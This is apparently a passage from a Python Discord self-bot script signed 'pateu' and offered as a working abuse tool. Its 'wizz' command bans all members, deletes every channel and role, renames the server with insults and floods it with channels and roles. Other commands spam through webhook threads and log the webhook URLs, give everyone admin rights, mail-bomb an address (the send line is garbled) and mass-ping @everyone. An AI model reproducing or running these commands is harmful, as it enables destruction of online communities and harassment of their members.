    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
    'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
    'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko'
]


@client.command()
async def wizz(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='pateu FUCKED YOU',
                             description='pateu FUCKED YOU',
                             reason='pateu RUNS YOU',
                             icon=None,
                             banner=None)
    except:
        pass

    for _i in range(100):
        await ctx.guild.create_text_channel(name='pateu RUNS YOU')

    for _i in range(100):
        await ctx.guild.create_role(name='pateu RUNS YOU')

    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason='pateu RUNS THIS SERVER')
        except:
            pass

    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason='pateu FUCKED THIS SERVER')
        except:
            pass


format = '%a, %d %b %Y | %H:%M:%S % ZGMT'


@client.command()
async def rr(ctx, *, name):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        await role.edit(name=name)


from random import choice
from discord.ext import commands


@client.command()
@commands.guild_only()
async def tag(ctx):
    await ctx.message.delete()
    await ctx.send(
        choice(tuple(member.mention for member in ctx.guild.members)))

    import random


@client.command()
async def rip(ctx):
    await ctx.message.delete()
    channel = ctx.channel
    randomMember = random.choice(channel.guild.members)
    randomMember1 = random.choice(channel.guild.members)
    randomMember2 = random.choice(channel.guild.members)
    await ctx.send(
        f'{randomMember.mention}{randomMember1.mention}{randomMember2.mention}'
    )
    await ctx.channel.purge(limit=1)
    await asyncio.sleep(5)
    await ctx.send(">rip")


@client.command()
async def rc(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```SUCCESSFULLY KICKED USER```')


@client.command()
async def role(ctx, user):
    await ctx.message.delete()
    await ctx.send(f"<@235148962103951360> role {user} 869444380879101952")
    await ctx.send(f"-invite reset {user}")
    await ctx.send(f"{user} **GOO VOUCH** <#869433500347031593>")


@client.command()
async def bbb(ctx, amount: int = None):
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass


@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send('```SUCCESSFULLY BANNED USER```')


@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=False)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY LOCKED')


@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MHYDRAA + 'I have given everyone admin.' + Fore.RESET)
    except:
        print(Fore.GREEN + 'I was unable to give everyone admin' + Fore.RESET)


@client.command()
async def unlock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=True)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY UNLOCKED')


@client.command()
async def unban(ctx, *, member):
    banned_user = await ctx.guild.bans()
    member_name, member_discriminator = member.split('#')
    for ban_entry in banned_user:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name,
                                               member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"Unbanned {user.mention}")
            return


@client.command()
async def clear(ctx, amount=5):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {
            'content': '@everyone ** pateu ON TOP AO**'
        }
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url, )).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='fucked BY pateu')
                threading.Thread(target=ssspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


@client.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message, url='http://www.twitch.tv/')
    await client.change_presence(activity=stream)


@client.command()
async def watch(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


@client.command()
async def removestatus(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=(discord.Status.dnd))


@client.command()
async def massmail(ctx, reciver):
    email = '..................................@gmail.com'
    password = '...............................'
    reciever = reciver
    sslcontext = ssl.create_default_context()
    for i in range(0, 1000):
        message = '  bob SELF BOT RUNS YOUR MAILS\n  '
        port = 465
        connection = smtplib.SMTP_SSL('smtp.gmail.com',
                                      port,
                                      context=sslcontext)
        connection.login(email, password)
        connection.sendmailemailrecievermessage
        await ctx.send('DONE')


@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@client.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('```' + message + '```')


@client.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=100).flatten()
    for message in messages:
        await message.add_reaction(emote)


@client.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = client.get_user(user.id)
    if ctx.author.id == client.user.id:
        return
    try:
        await user.send(message)
    except:
        pass


@client.command()
async def embed(ctx, *, description):
    embed = discord.Embed(title='bob self bot', description=description)
    embed.set_footer(text='Made By pateu')
    await ctx.send(embed=embed)


@client.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(
        arguments[str.find(arguments, 'msg:'):str.find(arguments, '1:'
                                                       )]).replace('msg:', '')
    option1 = discord.utils.escape_markdown(
        arguments[str.find(arguments, '1:'):str.find(arguments, '2:'
                                                     )]).replace('1:', '')
    option2 = discord.utils.escape_markdown(
        arguments[str.find(arguments, '2:'):]).replace('2:', '')
    message = await ctx.send(
        f"`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`")
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')


@client.command()
async def leave(ctx, guild_id):
    await client.get_guild(int(guild_id)).leave()
    await ctx.send(f"I left: {guild_id}")


@client.command()
async def hi(ctx):
    await ctx.add_reaction('::cool_panda:')


@client.command()
async def bump(ctx):
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')
    await asyncio.sleep(7200)
    await ctx.send('!d bump')


@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


@client.command()
async def rdop(ctx):
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')
    await ctx.send('@everyone ** bob self bot on top **')


keep_alive()
client.run(token, bot=False)
